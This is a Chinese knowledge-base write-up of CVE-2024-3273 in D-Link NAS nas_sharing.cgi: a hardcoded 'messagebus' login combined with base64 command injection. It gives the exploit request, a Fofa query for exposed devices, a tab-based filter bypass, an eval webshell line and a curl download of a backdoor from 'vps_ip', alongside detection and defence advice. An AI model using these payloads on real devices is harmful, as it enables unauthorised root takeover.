---
id: iot-dlink-nas-sharing-cgi-messagebus-backdoor-base64-system-rce
title: CVE-2024-3273 D-Link NAS nas_sharing.cgi 未授权 RCE：硬编码 messagebus 后门 + system 参数 base64 命令注入（空格过滤用 tab 绕过）
type: scenario
domain: iot
path: iot
technique: nas-sharing-cgi-hardcoded-backdoor-base64-system-command-injection
aliases:
- CVE-2024-3273
- D-Link NAS nas_sharing.cgi 命令执行
- messagebus 硬编码后门
- ShareCenter
- system 参数 base64 命令注入
- 空格过滤 tab 绕过
tags:
- iot
- dlink
- nas
- cve-2024-3273
- command-injection
- hardcoded-backdoor
- unauth
- base64
- cgi
- tab-bypass
- root
- fofa
cve:
- CVE-2024-3273
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-T1-4
  verified_at: '2026-11-07T21:48:55+08:00'
  notes: 已对照原文及 25 张图核对；图02 响应 uid=0(root) gid=0(root)、图10 用 tab 替换空格后 ls / -al 成功列出根目录、图12/14 写文件成功，未授权 RCE 链已打通，非 DoS/未打通/半链；dedup 除自身外 related 候选(DIR-645 ssdpcgi、DIR-605L boa pin、service.cgi EVENT、Cisco RV34x 等)均为不同链，dedup_review 成立；原文只写 D-Link NAS 未给具体型号/固件版本区间，不设 affected_versions；路径 iot 合法(iot/protocol 描述为 MQTT/CoAP/Modbus/Zigbee 协议故不采用)，CVE-2024-3273，含原理/触发条件/PoC/检测防御，frontmatter 无 sources 违规字段；未验证点：未独立复现设备，PoC 为最小片段
---

## 一句话结论

D-Link NAS 的 `/cgi-bin/nas_sharing.cgi` 内置硬编码账户（`user=messagebus`、`passwd=` 空密码）可绕过认证，且 `system` 参数会接收 base64 编码的命令并解码后执行；未授权攻击者只需把命令 base64 后拼进 GET 请求即可获得 root 命令执行，命令中的空格被过滤时用 tab 替换即可继续写文件/落地 WebShell。

## 原理

- **认证旁路（后门账户）**：CGI 的 HTTP GET 处理程序里内置了一组硬编码凭据——用户名 `messagebus`、空口令。带上 `user=messagebus&passwd=&cmd=15` 即可通过校验，无需任何真实账号，构成未授权入口。
- **命令注入**：`system` 参数的值被当作要执行的系统命令（先做 base64 解码）交给 `system()` 一类调用执行，攻击者完全可控。用 base64 是为了让命令串里的特殊字符不破坏 URL/参数解析。
- **权限高**：命令以设备上的 root 身份执行，探测 `id` 回显 `uid=0(root) gid=0(root)`，因此危害是整机接管而非低权限执行。
- **回显形式**：执行结果直接拼在 XML 响应正文里（`<?xml version="1.0" encoding="UTF-8"?><config><nas_sharing><auth_state>1</auth_state></nas_sharing></config>` 一并返回），无需盲打。
- **空格过滤与 tab 绕过**：该链对命令里的空格做了过滤/处理，导致 `echo 666 > 666.php` 能创建文件但内容为空、`ls / -al` 等含空格命令无回显；把空格换成 tab（`\t`）后 shell 仍按分隔符解析，命令恢复正常，据此可写出含完整内容的 PHP 文件。
- **完整性**：从探测 `id` 到写 phpinfo、写木马、蚁剑连接取得 root 终端全程打通并有截图验证，是完整可用的未授权 RCE 链，不是仅 DoS、未打通或半条链。

## 触发条件

- 目标为受影响 D-Link NAS/ShareCenter 设备，且 `/cgi-bin/nas_sharing.cgi` 可从攻击者侧访问（多为暴露在公网/内网的设备管理口）。
- CGI 保留硬编码 `messagebus` 账户与 `system` 参数命令执行逻辑。
- 命令需 base64 编码后放入 `system`；命令中的空格必须替换为 tab 才能生效。
- 若想落地 WebShell，Web 目录（如 `/var/www/cgi-bin/`）需可写且 PHP 可解析（该环境为 PHP 5.2.17 CGI/FastCGI）。

## 利用步骤

1. **资产发现**：用测绘语句 `body="Text:In order to access the ShareCenter"` 在 Fofa / Hunter / Quake 检索暴露设备。
2. **漏洞探测**：`echo -n "id" | base64` 得 `aWQ=`，请求 `/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ=`；响应含 `uid=0(root) gid=0(root)` 即确认存在漏洞。
3. **绕过空格**：把命令中每个空格替换为 tab，例如 `ls\t/\t-al`，base64 编码后作为 `system` 传入，可正常得到目录列表。
4. **写文件验证**：`echo\t"\t<?php\tphpinfo();\t?>"\t>\t7.php` 编码后注入，访问 `7.php` 能看到 phpinfo（确认 PHP 版本与 Web 目录可写可执行）。
5. **落地 WebShell**：写入一句话木马（在 PHP 5.2 魔术引号环境下需配合 `stripslashes()`，见 [[web-php-rce-magic-quotes-stripslashes-webshell-write-bypass]]），蚁剑连接取得 root 终端。
6. **文件写入受限时的替代**：若只能操作文件、无法直接回显命令，可 `curl\tvps_ip:8000/qsd-php-backdoor.php\t-o\ttheme-config.php` 下载功能完整的大马（提供目录遍历、MySQL 查询、命令执行），访问后即可用其 `Execute Shell Command` 执行 `ls / -al` 等命令。

## PoC

```bash
# 探测命令
echo -n "id" | base64          # aWQ=
# 探测请求
GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ=
# 响应：uid=0(root) gid=0(root) + <config><nas_sharing><auth_state>1</auth_state></nas_sharing></config>

# 空格用 tab 替换后写 phpinfo（\t 表示实际 tab 字符）
echo\t"\t<?php\tphpinfo();\t?>"\t>\t7.php     # base64 后填入 system 参数
# 写一句话（同样全部空格换 tab）
echo\t"\t<?php\t@eval(stripslashes($_POST['love']));\t?>"\t>\t3.php
```

命令串经 base64 编码后拼到 `?user=messagebus&passwd=&cmd=15&system=<b64>` 即可；无自动化利用脚本，以上为最小复现片段，仅作知识记录，不在目标设备执行。

## 变体与关联

- **空白字符绕过**：核心是过滤了空格而没过滤 tab；同类思路还可尝试 `${IFS}`、`%09`、重定向符等其它空白/分隔形式（本文验证的是 tab）。
- **写入内容被转义**：命令里的单引号、括号、分号等在落盘时被自动加上反斜杠，导致普通一句话木马报错；`stripslashes()` 变体可让蚁剑连通，详见 [[web-php-rce-magic-quotes-stripslashes-webshell-write-bypass]]。
- **大马替代**：命令回显受限时用 `curl` 下载完整 WebShell 到 Web 目录，把"命令执行"能力转移到木马页面上。
- **关联**：与 D-Link 其它固件 CGI 命令注入（ssdpcgi/HTTP_ST、service.cgi/EVENT、boa start_wps pin 等）同属"用户输入拼进 `system()`"模式；区别是本例附带硬编码账户，构成完全未授权入口。

## 检测与防御

- **修复**：升级/替换厂商固件，移除硬编码 `messagebus` 账户与 `system` 参数命令执行逻辑；无法升级时限制或禁用 `nas_sharing.cgi` 接口。
- **认证**：设备 Web 管理口不要暴露公网，强制认证与访问控制，杜绝空口令账户。
- **命令层**：对 `system` 参数做严格白名单，禁止任意命令；过滤空格的同时也要覆盖 tab、`${IFS}`、换行等所有空白与分隔变体，避免"只挡空格"的绕过。
- **文件层**：Web 目录设为不可写/不可执行 CGI 写入的脚本，部署文件完整性监控，及时发现新增 `.php`。
- **检测**：监控对 `/cgi-bin/nas_sharing.cgi` 带 `system=` 的请求、参数中的 base64 长串、XML 响应里夹杂命令输出、以及 Web 目录异常新增的 php 文件；WAF/IDS 对 `user=messagebus` + `system=` 组合请求告警。
